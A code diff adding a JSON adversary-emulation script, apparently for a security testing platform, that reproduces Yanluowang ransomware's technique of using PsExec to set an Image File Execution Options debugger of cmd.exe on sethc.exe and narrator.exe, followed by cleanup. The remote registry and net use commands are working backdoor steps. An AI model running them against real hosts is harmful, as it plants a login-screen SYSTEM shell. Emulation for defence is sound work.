@@ -1,0 +1,222 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Yanluowang_ifeo_psexec",
+        "display_name": "Yanluowang_ifeo_psexec",
+        "name": "Yanluowang_ifeo_psexec",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "3": {
+                "name": "INSTRUCTIONS",
+                "type": "assign",
+                "value": "Make sure you set the username and password for your target. Due to fun with the reg.exe with localhost, you command you must use a hostname if you wish this to execute locally."
+            },
+            "4": {
+                "name": "PSExecUsername",
+                "type": "assign",
+                "value": "administrator"
+            },
+            "5": {
+                "name": "PSExecPassword",
+                "type": "assign",
+                "value": "abc123!!!"
+            },
+            "6": {
+                "name": "PSExecHostname",
+                "type": "assign",
+                "value": "192.168.134.150"
+            },
+            "7": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Check login to host."
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c echo the username is $(4).response",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c echo the password is $(5).response",
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c echo the IP is $(6).response",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net use \\\\$(6).response\\IPC$ /u:$(4).response $(5).response",
+                "rtags": [
+                    "att&ck-technique:T1135"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "function": "ifelse",
+                "next": "29",
+                "step": "11",
+                "type": "decision",
+                "value": "completed successfully",
+                "verb": "does not contain"
+            },
+            "13": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Establish baseline so we can restore later"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"\\\\$(6).response\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"\\\\$(6).response\\\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"\\\\$(6).response\\\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Execute the emulation, setting debugger under IFEO for narrator.exe and sethc.exe using PSExec"
+            },
+            "18": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS://shared/threats/common_x64/PsExec.exe --overwrite --dest c:\\users\\public\\psexec.exe",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "c:\\users\\public\\psexec \\\\$(6).response -accepteula reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\" /v Debugger /d cmd.exe /f",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1068"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "c:\\users\\public\\psexec \\\\$(6).response -accepteula reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe /f",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1068"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "name": "ECHO",
+                "type": "assign",
+                "value": "Begin cleanup steps."
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "c:\\users\\public\\psexec \\\\$(6).response -accepteula reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /f",
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "c:\\users\\public\\psexec \\\\$(6).response -accepteula reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\" /v Debugger /f",
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "function": "ifelse",
+                "next": "26",
+                "step": "15",
+                "type": "decision",
+                "value": "(Default)",
+                "verb": "contains"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "c:\\users\\public\\psexec \\\\$(6).response -accepteula reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\" /f",
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "function": "ifelse",
+                "next": "28",
+                "step": "16",
+                "type": "decision",
+                "value": "(Default)",
+                "verb": "contains"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "c:\\users\\public\\psexec \\\\$(6).response -accepteula reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f",
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net use \\\\$(6).response\\IPC$ /d",
+                "rtags": [
+                    "att&ck-technique:T1070.005"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
